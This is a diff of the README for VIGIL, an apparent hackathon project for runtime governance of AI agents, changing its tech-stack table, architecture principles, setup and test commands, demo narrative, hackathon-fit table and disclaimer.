-| Agent Protocol  | Model Context Protocol           |
-| Governance      | Custom runtime policy engine     |
-| AI Inference    | Featherless                      |
-| Frontend        | Next.js / React                  |
-| Styling         | Tailwind CSS                     |
-| Real-Time State | WebSockets                       |
-| Observability   | OpenTelemetry                    |
-| Telemetry       | SigNoz                           |
-| Authentication  | OAuth 2.1 / PKCE                 |
-| Agent SDK       | Python                           |
-| Testing         | Go testing · Pytest · Playwright |
-| Packaging       | Docker                           |
-| Deployment      | Container-based infrastructure   |
+| Layer          | Technology                   |
+| -------------- | ---------------------------- |
+| Runtime        | Go                           |
+| Protocol       | Model Context Protocol       |
+| Governance     | Custom policy/runtime engine |
+| AI Inference   | Featherless                  |
+| Frontend       | Next.js + React              |
+| Styling        | Tailwind CSS                 |
+| Real-Time      | WebSockets                   |
+| Observability  | OpenTelemetry                |
+| Telemetry      | SigNoz                       |
+| Authentication | OAuth 2.1 / PKCE             |
+| Agent SDK      | Python                       |
+| Testing        | Go · Pytest · Playwright     |
+| Packaging      | Docker                       |
 
 ---
 
-# Repository Structure
+# Architecture Principles
 
-```text
-vigil/
-├── cmd/
-│   ├── vigil-server/
-│   └── vigil-cli/
-│
-├── pkg/
-│   ├── governance/
-│   ├── policy/
-│   ├── cost/
-│   ├── behavior/
-│   ├── security/
-│   ├── router/
-│   ├── telemetry/
-│   └── audit/
-│
-├── frontend/
-├── sdk/
-├── demo/
-├── tests/
-├── integrations/
-├── docs/
-│
-├── Dockerfile
-├── docker-compose.prod.yaml
-├── .env.example
-├── SECURITY.md
-└── README.md
-```
+### Deterministic First
+
+Security-critical checks should remain deterministic whenever possible.
+
+### AI Where It Adds Value
+
+Models are used for semantic ambiguity and deeper risk analysis.
+
+### Fail Closed
+
+Critical governance failures should not silently become unrestricted execution.
+
+### Least Privilege
+
+Agents should receive only the capabilities required for their declared task.
+
+### Human Override
+
+Operators retain control over pause and termination.
+
+### Explicit Uncertainty
+
+Model confidence is not equivalent to authorization.
+
+### Provider Flexibility
+
+The governance layer should not depend on a single model provider.
 
 ---
 
@@ -1028,7 +902,6 @@ vigil/
 * Node.js `20+`
 * Docker
 * Featherless credentials for live model evaluation
-* Optional SigNoz/OpenTelemetry configuration
 
 ## Clone
 
@@ -1045,19 +918,15 @@ cp .env.example .env.local
 
 Configure the required environment variables.
 
-> Never commit credentials or API keys.
+Never commit API keys or secrets.
 
----
-
-# Run the Backend
+## Start Backend
 
 ```bash
 go run cmd/vigil-server/main.go
 ```
 
----
-
-# Run the Dashboard
+## Start Frontend
 
 ```bash
 cd frontend
@@ -1071,9 +940,7 @@ Open:
 http://localhost:3000
 ```
 
----
-
-# Docker
+## Docker
 
 ```bash
 docker compose -f docker-compose.prod.yaml up --build
@@ -1083,20 +950,20 @@ docker compose -f docker-compose.prod.yaml up --build
 
 # Testing
 
-## Go Tests
+## Go
 
 ```bash
 go test ./...
 ```
 
-## Python Integration Tests
+## Python
 
 ```bash
 cd tests
 uv run pytest integration/
 ```
 
-## End-to-End Tests
+## End-to-End
 
 ```bash
 cd tests/e2e
@@ -1112,143 +979,141 @@ python3 demo/verify.py
 
 ---
 
-# Demo Flow
+# Recommended Demo
 
-The recommended VIGIL demonstration is:
+The entire demo should tell one story.
 
-```mermaid
-flowchart TD
+### 01 — Declare Intent
 
-    A[Declare Agent Intent]
-      --> B[Start Agent Session]
+> Fix failing repository tests. No network access. No secrets. Maximum budget: $2.
 
-    B --> C[Normal Tool Calls]
-    C --> D[ALLOW]
+### 02 — Normal Execution
 
-    D --> E[Agent Deviates From Intent]
-
-    E --> F[Behavior + Policy Evaluation]
-
-    F --> G[Featherless Risk Analysis]
-
-    G --> H{Decision}
-
-    H -->|Safe| I[ALLOW]
-    H -->|Recoverable| J[FALLBACK]
-    H -->|Requires Review| K[PAUSE]
-    H -->|Unsafe| L[BLOCK]
-
-    I --> M[Audit + Telemetry]
-    J --> M
-    K --> M
-    L --> M
+```text
+read_file      → ALLOW
+search_code    → ALLOW
+run_tests      → ALLOW
 ```
 
-The most important moment is:
+### 03 — Agent Deviates
 
-> **An agent attempts an action that it was not authorized to perform, VIGIL detects the violation, evaluates the risk, and stops the action before execution.**
+```text
+network request
+or
+dangerous shell command
+```
+
+### 04 — VIGIL Intercepts
+
+```text
+Intent violation
++
+Behavioral anomaly
++
+Security signal
+```
+
+### 05 — Featherless Escalation
+
+A specialized model evaluates the ambiguous runtime event.
+
+### 06 — Enforcement
+
+```text
+BLOCK
+```
+
+or:
+
+```text
+PAUSE
+```
+
+or:
+
+```text
+FALLBACK
+```
+
+### 07 — Audit
+
+The complete decision appears in the dashboard and trace.
 
 ---
 
-# Hackathon Context
+# Hackathon Fit
 
-VIGIL is built for the **Impact Forge: Summer 2026 Hackathon** under the **General Innovation** track.
+## Impact Forge — Summer 2026
 
-The project directly targets the track's focus on:
+VIGIL is built for the **General Innovation** track.
+
+The project directly addresses:
 
 * developer tooling;
 * automation workflows;
-* full-stack applications;
-* real-world utility.
+* AI infrastructure;
+* runtime security;
+* cost governance;
+* real-world agent deployment.
 
-The implementation emphasizes a complete runtime governance workflow rather than a broad collection of disconnected AI features.
+### Why this project fits the judging criteria
 
-The project is also designed around the hackathon's emphasis on:
+| Criterion                     | VIGIL                                                                                            |
+| ----------------------------- | ------------------------------------------------------------------------------------------------ |
+| **Code Structure & Quality**  | Modular runtime governance architecture with explicit policy, cost, behavior and security layers |
+| **API & Compute Integration** | Featherless-powered adaptive multi-model decision pipeline                                       |
+| **Innovation & Approach**     | Runtime enforcement based on intent + behavior + economics                                       |
+| **Functional Execution**      | Live interception, risk evaluation and ALLOW/PAUSE/BLOCK/FALLBACK decisions                      |
+| **3-Minute Demo**             | One complete agent failure → detection → reasoning → intervention story                          |
+| **Documentation & Setup**     | Architecture, workflow diagrams, setup, testing and implementation details                       |
 
-**technical execution · originality · utility · demo quality**
-
----
-
-# Why This Problem Matters
-
-The first wave of AI infrastructure focused on making models:
-
-> **more capable.**
-
-The next wave must make autonomous systems:
-
-> **more controllable.**
-
-When an agent can execute software, interact with tools, and operate for extended periods, intelligence alone is not enough.
-
-The system also needs:
-
-* boundaries;
-* accountability;
-* cost controls;
-* runtime policy;
-* intervention;
-* observability.
-
-VIGIL is built around that execution boundary.
+The hackathon explicitly says advanced inference pipelines score highest for API/compute integration, making the Featherless routing layer a core part of the submission rather than a decorative integration. ([impactforge26.devpost.com](https://impactforge26.devpost.com/))
 
 ---
 
-# Vision
+# Why This Is More Than a Hackathon Demo
 
-We believe autonomous agents will become a fundamental software primitive.
+The product thesis is simple:
 
-They will write code.
+> **As AI agents become more autonomous, runtime governance becomes infrastructure.**
 
-Operate infrastructure.
+The first generation of AI systems focused on:
 
-Analyze data.
+**making models more capable.**
 
-Run workflows.
+The next generation needs infrastructure for:
 
-Interact with APIs.
+**making autonomous systems controllable.**
 
-Manage systems.
-
-The infrastructure question will therefore evolve from:
-
-> **“Can this agent do it?”**
-
-to:
-
-> **“Should this agent be allowed to do it?”**
-
-VIGIL aims to become the runtime layer that answers that question.
-
----
-
-# VIGIL
-
-## **Observe what agents do.**
-
-## **Understand the context.**
-
-## **Control what happens next.**
-
-**Runtime Governance · Adaptive Security · Cost Control · Policy Enforcement · Agent Observability**
+VIGIL is built around that control boundary.
 
 ---
 
 # Current Status
 
-VIGIL is an actively developed, production-oriented runtime governance prototype.
+VIGIL is a production-oriented runtime governance prototype.
 
-The repository contains both implemented functionality and experimental components. Features should be considered according to their current implementation and verification status rather than interpreted as security certifications or production guarantees.
+The system is designed as a modular control plane that can evolve as:
 
-For the latest implementation details, consult the repository's implementation notes and test results.
+* agent protocols change;
+* model ecosystems expand;
+* tool access grows;
+* security requirements become stricter.
+
+Features should be evaluated according to their current implementation and verification status. VIGIL is not a security certification or compliance certification.
 
 ---
 
-# Live Resources
+# Live
 
-* **Dashboard:** https://vigil-featherless.vercel.app/
-* **API:** https://vigil-server.onrender.com/
-* **Source:** https://github.com/LSUDOKO/Vigil
+**Dashboard:**
+https://vigil-featherless.vercel.app/
+
+**API:**
+https://vigil-server.onrender.com/
+
+**Source:**
+https://github.com/LSUDOKO/Vigil
 
 ---
 
@@ -1256,6 +1121,8 @@ For the latest implementation details, consult the repository's implementation n
 
 * [Featherless](https://featherless.ai/)
 * [Featherless Model Catalog](https://featherless.ai/models/)
+* [Featherless — Open-Source AI Agents Now Have a Home](https://featherless.ai/blog/open-source-ai-agents-now-have-a-home)
+* [Featherless — NemoClaw Agent](https://featherless.ai/blog/run-nemoclaw-agent-in-one-click-on-featherless)
 * [Model Context Protocol](https://modelcontextprotocol.io/)
 * [OpenTelemetry](https://opentelemetry.io/)
 * [SigNoz](https://signoz.io/)
@@ -1272,6 +1139,6 @@ MIT
 
 VIGIL is experimental infrastructure.
 
-It does not provide a guarantee of secure or compliant autonomous execution, and it is not a substitute for application security, sandboxing, identity management, network isolation, or formal compliance programs.
+It does not guarantee safe autonomous execution and does not constitute a security or compliance certification.
 
-Production deployments should be independently threat-modeled, tested, and hardened for their specific environment.
+Production deployments should be independently threat-modeled, tested, isolated, and hardened for their specific environment.
